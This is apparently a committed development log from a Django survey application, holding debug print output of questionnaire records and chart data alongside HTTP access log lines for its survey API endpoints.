+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 1}]
+[{'id': 53}, {'id': 60}, {'id': 62}, {'id': 131}, {'id': 134}, {'id': 139}, {'id': 140}, {'id': 138}, {'id': 142}, {'id': 113}, {'id': 124}, {'id': 143}]
+[{'id': 124}, {'id': 139}, {'id': 140}, {'id': 150}]
+[{'id': 138, 'title': '的那网络文化的俩位', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 139, 'title': '大撒旦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 140, 'title': '111', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 142, 'title': '222', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 143, 'title': '欧几哦i', 'type': '0', 'state': 1, 'used_time': 1}]
+i am here
+150
+None
+yangyang
+444
+150 doublepi
+150
+None
+150
+[[{'name': '选项1', 'y': 2}, {'name': '选项2', 'y': 0}], [{'name': '选项1', 'y': 2}, {'name': '选项2', 'y': 1}], [{'name': 0, 'y': 0}, {'name': 1, 'y': 0}, {'name': 2, 'y': 2}, {'name': 3, 'y': 0}, {'name': 4, 'y': 0}], [{'name': 'hello', 'y': 1}, {'name': '。', 'y': 1}, {'name': 'fuck', 'y': 1}, {'name': ' ', 'y': 1}, {'name': 'you', 'y': 1}]]
+150
+sss
+aaaa
+111111
+None
+yangyang
+444
+150 doublepi
+150
+None
+150
+[[{'name': '选项1', 'y': 2}, {'name': '选项2', 'y': 0}], [{'name': '选项1', 'y': 2}, {'name': '选项2', 'y': 1}], [{'name': 0, 'y': 0}, {'name': 1, 'y': 0}, {'name': 2, 'y': 2}, {'name': 3, 'y': 0}, {'name': 4, 'y': 0}], [{'name': 'hello', 'y': 1}, {'name': '。', 'y': 1}, {'name': 'fuck', 'y': 1}, {'name': ' ', 'y': 1}, {'name': 'you', 'y': 1}]]
+150
+True
+None
+fuckman
+444
+124
+124
+133
+133
+131
+131
+134
+134
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 2}]
+[{'id': 62}, {'id': 53}]
+[{'id': 124}, {'id': 133}, {'id': 131}, {'id': 134}]
+[]
+i am here
+150
+bbb
+<class 'str'>
+i am here
+152
+152 doublepi
+152
+None
+152
+[[{'name': 0, 'y': 0}, {'name': 1, 'y': 0}, {'name': 2, 'y': 0}, {'name': 3, 'y': 0}, {'name': 4, 'y': 0}, {'name': 5, 'y': 0}, {'name': 6, 'y': 0}, {'name': 7, 'y': 0}, {'name': 8, 'y': 1}, {'name': 9, 'y': 0}]]
+152
+i am here
+124
+124
+133
+133
+131
+131
+134
+134
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}]
+[{'id': 62}, {'id': 53}]
+[{'id': 124}, {'id': 133}, {'id': 131}, {'id': 134}]
+[{'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}]
+bbb
+<class 'str'>
+aaaaa
+[{'content': 'a', 'choosed': False, 'arg': 0}, {'content': 'b', 'choosed': False, 'arg': 0}]
+348
+?????
+348
+?????
+bbb
+<class 'str'>
+aaaaa
+[{'content': 'a', 'choosed': False, 'arg': 0}, {'content': 'b', 'choosed': False, 'arg': 0}, {'content': 'c', 'choosed': False, 'arg': 0}]
+349
+?????
+349
+?????
+349
+?????
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+124
+124
+133
+133
+131
+131
+134
+134
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 0}]
+[{'id': 62}, {'id': 53}]
+[{'id': 124}, {'id': 133}, {'id': 131}, {'id': 134}]
+[{'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}]
+i am here
+124
+124
+133
+133
+131
+131
+134
+134
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 0}][09/Jun/2024 06:58:42] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1133
+[09/Jun/2024 07:00:02] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1048
+[09/Jun/2024 07:00:31] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 36
+[09/Jun/2024 07:01:34] "POST /api/qs/user/logout HTTP/1.1" 200 20
+[09/Jun/2024 07:01:40] "POST /api/qs/user/login HTTP/1.1" 200 179
+[09/Jun/2024 07:01:54] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1421
+[09/Jun/2024 07:02:00] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 973
+[09/Jun/2024 07:02:00] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 500 145
+[09/Jun/2024 07:02:04] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1421
+[09/Jun/2024 07:02:16] "POST /api/qs/Submit/cross_analyse_FS HTTP/1.1" 200 144
+[09/Jun/2024 07:02:19] "POST /api/qs/Submit/cross_analyse_SE HTTP/1.1" 200 160
+[09/Jun/2024 07:02:21] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1421
+[09/Jun/2024 07:02:52] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1694
+[09/Jun/2024 07:02:54] "POST /api/qs/Submit/collect_survey HTTP/1.1" 200 37
+[09/Jun/2024 07:02:55] "POST /api/qs/Submit/cancel_collections HTTP/1.1" 200 35
+[09/Jun/2024 07:05:11] "GET / HTTP/1.0" 404 179
+[09/Jun/2024 07:07:50] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1694
+[09/Jun/2024 07:08:12] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1421
+[09/Jun/2024 07:08:15] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1694
+[09/Jun/2024 07:08:25] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:08:26] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 497
+[09/Jun/2024 07:08:26] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 99
+[09/Jun/2024 07:08:26] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 118
+[09/Jun/2024 07:08:28] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:08:28] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 460
+[09/Jun/2024 07:08:28] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 98
+[09/Jun/2024 07:08:28] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 117
+[09/Jun/2024 07:08:29] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:08:30] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 445
+[09/Jun/2024 07:08:30] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 98
+[09/Jun/2024 07:08:30] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 129
+[09/Jun/2024 07:08:37] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:08:38] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 445
+[09/Jun/2024 07:08:38] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 98
+[09/Jun/2024 07:08:38] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 117
+[09/Jun/2024 07:08:40] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 430
+[09/Jun/2024 07:08:43] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:08:44] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 370
+[09/Jun/2024 07:08:47] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:08:48] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1118
+[09/Jun/2024 07:08:50] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:08:51] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 490
+[09/Jun/2024 07:08:58] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 69
+[09/Jun/2024 07:09:01] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 69
+[09/Jun/2024 07:09:03] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:09:05] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1118
+[09/Jun/2024 07:09:13] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 69
+[09/Jun/2024 07:09:15] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 69
+[09/Jun/2024 07:10:03] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:10:06] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1421
+[09/Jun/2024 07:10:11] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1421
+[09/Jun/2024 07:10:42] "POST /api/qs/Submit/create_QN HTTP/1.1" 200 54
+[09/Jun/2024 07:10:43] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1525
+/root/wtf/lib64/python3.6/site-packages/django/db/models/fields/__init__.py:1419: RuntimeWarning: DateTimeField Survey.release_time received a naive datetime (2024-06-09 07:10:46.327473) while time zone support is active.
+  RuntimeWarning)
+[09/Jun/2024 07:10:46] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:10:48] "POST /api/qs/Submit/release_to_square HTTP/1.1" 200 37
+[09/Jun/2024 07:11:59] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 497
+[09/Jun/2024 07:11:59] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 99
+[09/Jun/2024 07:12:00] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 118
+[09/Jun/2024 07:12:01] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:12:23] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1274
+[09/Jun/2024 07:12:29] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1048
+[09/Jun/2024 07:12:44] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 30
+[09/Jun/2024 07:13:27] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 475
+[09/Jun/2024 07:13:34] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:13:38] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 475
+[09/Jun/2024 07:13:41] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:13:42] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 445
+[09/Jun/2024 07:13:42] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 98
+[09/Jun/2024 07:13:42] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 129
+[09/Jun/2024 07:13:44] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:13:45] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 445
+[09/Jun/2024 07:13:45] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 98
+[09/Jun/2024 07:13:45] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 129
+[09/Jun/2024 07:13:46] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:13:47] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 445
+[09/Jun/2024 07:13:47] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 98
+[09/Jun/2024 07:13:47] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 117
+[09/Jun/2024 07:13:48] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:13:48] "POST /api/qs/Submit/data_analysis_FS HTTP/1.1" 200 370
+[09/Jun/2024 07:13:48] "POST /api/qs/Submit/data_analysis_SE HTTP/1.1" 200 135
+[09/Jun/2024 07:13:48] "POST /api/qs/Submit/data_analysis_TH HTTP/1.1" 200 106
+[09/Jun/2024 07:13:49] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:13:52] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1118
+[09/Jun/2024 07:13:57] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:13:58] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1118
+[09/Jun/2024 07:14:05] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+[09/Jun/2024 07:14:50] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 1118
+[09/Jun/2024 07:14:55] "POST /api/qs/Submit/get_history HTTP/1.1" 200 797
+
+[{'id': 62}, {'id': 53}]
+[{'id': 124}, {'id': 133}, {'id': 131}, {'id': 134}]
+[{'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}]
+i am here
+153
+True
+None
+王飞阳
+444
+153 王飞阳
+153
+None
+153
+153
+[{'id': 348, 'title': '111'}, {'id': 349, 'title': '222'}, {'id': 350, 'title': '333'}, {'id': 351, 'title': '444'}]
+153 349 351
+124
+124
+139
+139
+140
+140
+150
+150
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}]
+[{'id': 53}, {'id': 60}, {'id': 62}, {'id': 131}, {'id': 134}, {'id': 139}, {'id': 140}, {'id': 138}, {'id': 142}, {'id': 113}, {'id': 124}, {'id': 143}]
+[{'id': 124}, {'id': 139}, {'id': 140}, {'id': 150}]
+[{'id': 138, 'title': '的那网络文化的俩位', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 139, 'title': '大撒旦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 140, 'title': '111', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 142, 'title': '222', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 143, 'title': '欧几哦i', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}]
+62 王飞阳
+62
+王飞阳
+124
+124
+139
+139
+140
+140
+150
+150
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}]
+[{'id': 53}, {'id': 60}, {'id': 62}, {'id': 131}, {'id': 134}, {'id': 139}, {'id': 140}, {'id': 138}, {'id': 142}, {'id': 113}, {'id': 124}, {'id': 143}]
+[{'id': 124}, {'id': 139}, {'id': 140}, {'id': 150}]
+[{'id': 138, 'title': '的那网络文化的俩位', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 139, 'title': '大撒旦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 140, 'title': '111', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 142, 'title': '222', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 143, 'title': '欧几哦i', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}]
+124
+124
+139
+139
+140
+140
+150
+150
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}]
+[{'id': 53}, {'id': 60}, {'id': 62}, {'id': 131}, {'id': 134}, {'id': 139}, {'id': 140}, {'id': 138}, {'id': 142}, {'id': 113}, {'id': 124}, {'id': 143}]
+[{'id': 124}, {'id': 139}, {'id': 140}, {'id': 150}]
+[{'id': 138, 'title': '的那网络文化的俩位', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 139, 'title': '大撒旦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 140, 'title': '111', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 142, 'title': '222', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 143, 'title': '欧几哦i', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}]
+王飞阳
+138 王飞阳
+138
+None
+138
+[[{'name': '选项1', 'y': 1}, {'name': '选项', 'y': 0}]]
+138
+王飞阳
+139 王飞阳
+139
+None
+139
+[[{'name': '选项', 'y': 1}, {'name': '选项', 'y': 1}]]
+139
+王飞阳
+140 王飞阳
+140
+None
+140
+[[{'name': '选项', 'y': 1}, {'name': '选项', 'y': 1}]]
+140
+王飞阳
+142 王飞阳
+142
+None
+142
+[[{'name': '选项', 'y': 1}, {'name': '选项', 'y': 1}]]
+142
+i am here
+王飞阳
+i am here
+王飞阳
+i am here
+王飞阳
+i am here
+139
+139
+王飞阳
+i am here
+150
+150
+王飞阳
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+bbb
+<class 'str'>
+138 王飞阳
+138
+None
+138
+[[{'name': '选项1', 'y': 1}, {'name': '选项', 'y': 0}]]
+138
+王飞阳
+124
+124
+133
+133
+131
+131
+134
+134
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 154, 'title': 'os', 'type': '1', 'state': 1, 'used_time': 0}]
+[{'id': 62}, {'id': 53}]
+[{'id': 124}, {'id': 133}, {'id': 131}, {'id': 134}]
+[{'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}]
+i am here
+i am here
+王飞阳
+i am here
+王飞阳
+140 王飞阳
+140
+None
+140
+[[{'name': '选项', 'y': 1}, {'name': '选项', 'y': 1}]]
+140
+王飞阳
+140 王飞阳
+140
+None
+140
+[[{'name': '选项', 'y': 1}, {'name': '选项', 'y': 1}]]
+140
+王飞阳
+142 王飞阳
+142
+None
+142
+[[{'name': '选项', 'y': 1}, {'name': '选项', 'y': 1}]]
+142
+王飞阳
+143 王飞阳
+143
+None
+143
+[[{'name': 0, 'y': 0}, {'name': 1, 'y': 0}, {'name': 2, 'y': 1}, {'name': 3, 'y': 0}, {'name': 4, 'y': 0}]]
+143
+王飞阳
+i am here
+王飞阳
+i am here
+王飞阳
+i am here
+王飞阳
+124
+124
+139
+139
+140
+140
+150
+150
+[{'id': 53, 'title': 'fuck man', 'type': '0', 'state': 1, 'used_time': 4}, {'id': 60, 'title': 'asda', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 62, 'title': '达瓦', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 122, 'title': 'test1', 'type': '1', 'state': 1, 'used_time': 0}, {'id': 123, 'title': 'asd', 'type': '0', 'state': 0, 'used_time': 0}, {'id': 124, 'title': 'fkfyy', 'type': '0', 'state': 1, 'used_time': 0}, {'id': 131, 'title': 'fkkkkkk', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 133, 'title': '666', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 134, 'title': '555', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 136, 'title': '法尔大王', 'type': '0', 'state': 1, 'used_time': 2}, {'id': 150, 'title': '综合测试', 'type': '0', 'state': 1, 'used_time': 3}, {'id': 153, 'title': 'debug', 'type': '0', 'state': 1, 'used_time': 1}, {'id': 154, 'title': 'os', 'type': '1', 'state': 1, 'used_time': 0}][09/Jun/2024 07:15:01] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1763
+[09/Jun/2024 07:15:02] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1525
+[09/Jun/2024 07:15:06] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 840
+[09/Jun/2024 07:15:11] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 36
+[09/Jun/2024 07:15:20] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:15:22] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 840
+[09/Jun/2024 07:15:28] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:15:34] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 1525
+[09/Jun/2024 07:15:36] "POST /api/qs/Submit/pause_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:15:41] "POST /api/qs/Submit/get_history HTTP/1.1" 200 870
+[09/Jun/2024 07:15:56] "POST /api/qs/Submit/deploy_qn HTTP/1.1" 200 40
+[09/Jun/2024 07:15:59] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 527
+[09/Jun/2024 07:16:01] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:16:02] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 840
+[09/Jun/2024 07:16:08] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:16:25] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 527
+[09/Jun/2024 07:16:25] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 69
+[09/Jun/2024 07:16:28] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 69
+[09/Jun/2024 07:16:28] "POST /api/qs/Submit/get_square_survey_data HTTP/1.1" 200 1274
+[09/Jun/2024 07:16:30] "POST /api/qs/Submit/fill_in_qn_FS HTTP/1.1" 200 840
+[09/Jun/2024 07:16:35] "POST /api/qs/Submit/fill_in_qn_SE HTTP/1.1" 200 69
+[09/Jun/2024 07:17:09] "POST /api/qs/Submit/get_history HTTP/1.1" 200 869
+[09/Jun/2024 07:17:25] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 30
+[09/Jun/2024 07:17:26] "HEAD /api/qs/Submit/get_history HTTP/1.1" 405 41
+[09/Jun/2024 07:17:37] "POST /api/qs/Submit/create_QN HTTP/1.1" 200 54
+[09/Jun/2024 07:17:38] "POST /api/qs/Submit/get_survey_data HTTP/1.1" 200 138
